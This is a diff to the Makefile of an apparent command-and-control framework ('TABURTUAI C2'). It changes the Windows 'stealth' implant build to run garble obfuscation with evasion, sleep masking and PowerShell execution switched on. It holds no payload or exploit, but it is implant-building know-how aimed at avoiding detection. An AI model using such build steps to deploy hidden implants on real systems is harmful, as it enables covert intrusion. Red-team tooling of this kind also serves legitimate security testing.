@@ -6,7 +6,7 @@ SERVER_BIN   := $(BINARY_DIR)/server
 OPERATOR_BIN := $(BINARY_DIR)/operator
 GENERATE_BIN := $(BINARY_DIR)/generate
 STRENC_BIN   := $(BINARY_DIR)/strenc
-AGENT_DIR    := ./agent
+AGENT_DIR    := ./cmd/agent
 
 # Default C2 server (override via env or CLI)
 C2_SERVER   ?= http://127.0.0.1:8080
@@ -141,7 +141,7 @@ agent-windows: ## Build Windows agent (with console, for testing/dev)
 		$(AGENT_DIR)
 	$(call BUILD_STAT,$(BINARY_DIR)/agent_windows.exe)
 
-agent-win-stealth: ## Build Windows stealth agent (no console, stripped, evasion on)
+agent-win-stealth: ## Build Windows stealth agent (garble-obfuscated when available, no console, evasion on)
 	@mkdir -p $(BINARY_DIR)
 	@printf "\n  $(SEP)\n"
 	@printf "  $(CB)$(CC) TABURTUAI C2$(C0)  $(CD)·$(C0)  implant compiler\n"
@@ -153,15 +153,28 @@ agent-win-stealth: ## Build Windows stealth agent (no console, stripped, evasion
 	@[ -n "$(KILL_DATE)" ] && printf "    $(CD)%-12s$(C0) %s\n" "kill date" "$(KILL_DATE)" || true
 	@printf "    $(CD)%-12s$(C0) %s\n" "exec"     "powershell"
 	@printf "\n  $(CD)[*]$(C0) compiling …\n"
-	@GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
-	$(GO) build \
-		-ldflags "$(LDFLAGS_WIN) \
-			-X main.defaultExecMethod=powershell \
-			-X main.defaultEnableEvasion=true \
-			-X main.defaultSleepMasking=true \
-			$(if $(KILL_DATE),-X main.defaultKillDate=$(KILL_DATE),)" \
-		-o $(BINARY_DIR)/agent_windows_stealth.exe \
-		$(AGENT_DIR)
+	@{ \
+	  LDARGS="$(LDFLAGS_WIN) \
+	    -X main.defaultExecMethod=powershell \
+	    -X main.defaultEnableEvasion=true \
+	    -X main.defaultSleepMasking=true \
+	    $(if $(KILL_DATE),-X main.defaultKillDate=$(KILL_DATE),)"; \
+	  if command -v $(GARBLE) >/dev/null 2>&1; then \
+	    printf "    $(CD)%-12s$(C0) %s\n" "obfuscation" "garble -tiny -literals -seed=random"; \
+	    GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
+	    $(GARBLE) -tiny -literals -seed=random build \
+	      -ldflags "$$LDARGS" \
+	      -o $(BINARY_DIR)/agent_windows_stealth.exe \
+	      $(AGENT_DIR); \
+	  else \
+	    printf "    $(CD)%-12s$(C0) $(CR)%s$(C0)\n" "obfuscation" "none  (install: go install mvdan.cc/garble@latest)"; \
+	    GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
+	    $(GO) build \
+	      -ldflags "$$LDARGS" \
+	      -o $(BINARY_DIR)/agent_windows_stealth.exe \
+	      $(AGENT_DIR); \
+	  fi; \
+	}
 	$(call BUILD_STAT,$(BINARY_DIR)/agent_windows_stealth.exe)
 
 agent-win-garble: ## Build Windows agent with garble obfuscation
